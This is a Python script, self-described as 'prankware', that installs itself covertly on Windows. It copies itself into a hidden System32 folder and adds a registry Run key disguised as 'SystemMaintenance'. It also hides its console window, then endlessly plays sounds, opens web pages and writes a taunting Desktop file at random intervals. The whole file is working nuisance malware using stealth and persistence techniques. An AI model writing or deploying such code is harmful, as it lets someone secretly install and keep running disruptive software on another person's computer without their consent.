import ctypes
import os
import random
import shutil
import sys
import time
import webbrowser

import pygame

# --- THE GASLIGHT OS: STEALTH HAUNT V4.0 (REAL MEOW EDITION) ---

# Initialize audio mixer for the "Real Meow"
try:
    pygame.mixer.init()
except:
    pass  # Fallback to system beep if audio device is busy


def install_logic():
    """Ensures the script and audio file stay hidden in the system."""
    if sys.platform == "win32":
        target_dir = r"C:\Windows\System32\prankware"
        target_file = os.path.join(target_dir, "haunt.py")
        target_audio = os.path.join(target_dir, "meow.wav")

        # Check if we are already running from the hidden location
        if os.path.realpath(sys.argv[0]).lower() != target_file.lower():
            try:
                if not os.path.exists(target_dir):
                    os.makedirs(target_dir)

                # Copy the script and the audio file to System32 folder
                shutil.copy2(sys.argv[0], target_file)
                if os.path.exists("meow.wav"):
                    shutil.copy2("meow.wav", target_audio)

                # Hide the folder from the average user
                os.system(f'attrib +h "{target_dir}"')

                # Set up Registry Persistence (Run on Startup)
                import winreg as reg

                key = reg.OpenKey(
                    reg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0,
                    reg.KEY_SET_VALUE,
                )
                reg.SetValueEx(key, "SystemMaintenance", 0, reg.REG_SZ, target_file)
                reg.CloseKey(key)
            except Exception as e:
                # If we lack admin perms, we just run locally
                pass


def activate_chaos():
    """The brain of the haunt."""
    events = ["meow", "judge", "rickroll", "fruit_salad", "arch_linux"]
    choice = random.choice(events)

    if choice == "meow":
        try:
            # Look for the meow file in the local directory or the install dir
            sound_path = "meow.wav"
            if not os.path.exists(sound_path):
                sound_path = r"C:\Windows\System32\prankware\meow.wav"

            sound = pygame.mixer.Sound(sound_path)
            sound.play()
        except:
            print("\a")  # Fallback to system beep

    elif choice == "rickroll":
        webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

    elif choice == "fruit_salad":
        webbrowser.open("https://www.youtube.com/watch?v=gB4MNu6W9sg")

    elif choice == "arch_linux":
        webbrowser.open("https://archlinux.org/download/")

    elif choice == "judge":
        desk = os.path.join(os.path.expanduser("~"), "Desktop", "JUDGMENT.txt")
        with open(desk, "w") as f:
            f.write("I see what you're doing. - The Swiss Cat")


if __name__ == "__main__":
    # 1. Handle Stealth and Persistence
    if sys.platform == "win32":
        install_logic()
        # Hide the console window immediately
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    # 2. Start the Haunt Loop
    while True:
        # Meow or prank every 10 to 30 seconds for testing
        time.sleep(random.randint(10, 30))
        activate_chaos()
